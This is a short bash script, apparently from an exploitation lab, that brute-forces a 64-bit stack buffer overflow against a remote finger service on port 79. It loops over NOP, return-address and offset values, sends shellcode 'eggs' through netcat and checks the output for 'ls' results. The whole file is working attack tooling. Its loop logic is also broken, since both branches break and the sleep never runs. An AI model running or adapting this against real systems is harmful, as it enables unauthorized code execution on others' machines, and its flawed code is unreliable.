#!/bin/bash

# ONLY USE IF SENDING THROUGH NETCAT
# ONLY USE ON 64-BIT MACHINES
# ONLY USE `/bin/ls` WHEN BRUTE FORCING IN `ovf64.c`
# NOTE: SHELLCODE == 48 BYTES
# NOTE: x86_64 ALIGNS ON A `long long` BOUNDARY (8 BYTES 1111111100000000)
# NOTE: RET_ADDR ON 64-BIT == 8 BYTES EACH
# NOTE: MOST LIKELY MAKE ADJUSTMENTS TO RANGES // SMALLER INCREMENT == LONGER RUNTIME

# Used with Netcat to connect remotely
host="HOST_NAME_HERE"
port=79

# Adjust ranges
for nops in $(seq 4 4 250); do
    # Adjust ranges (# bytes = 8 * ret_addr)
    for ret_addr in $(seq 4 4 32); do
        # Adjust ranges
        for offset in $(seq 0 8 135168); do

            # Generate `egg`
            ./exploit "$nops" "$ret_addr" "$offset"

            # Send `egg` file through Netcat (nc)
            # and store the output to check for 
            # successful exploit
            result=$( (cat egg; echo) | nc "$host" "$port")

            # Check for a successful exploit by
            # testing the output with the word 
            # 'bin'. Expected output for an `ls`
            # command should contain the word 
            # 'bin' so we test the output with
            # `grep`.
            #
            # Success if 'bin' is found in the
            # output. Failure otherwise :(
            if echo "$result" | grep -q "bin"; then
                echo "SUCCESS with ./exploit $nops $ret_addr $offset"
                echo "Output: $result"
                break
            else
                echo "FAILED"
                echo "Output: $result"
                break
            fi

            # Limit 100 connections per second
            # 1 / 100 = 0.01
            sleep 0.01
        done
    done
done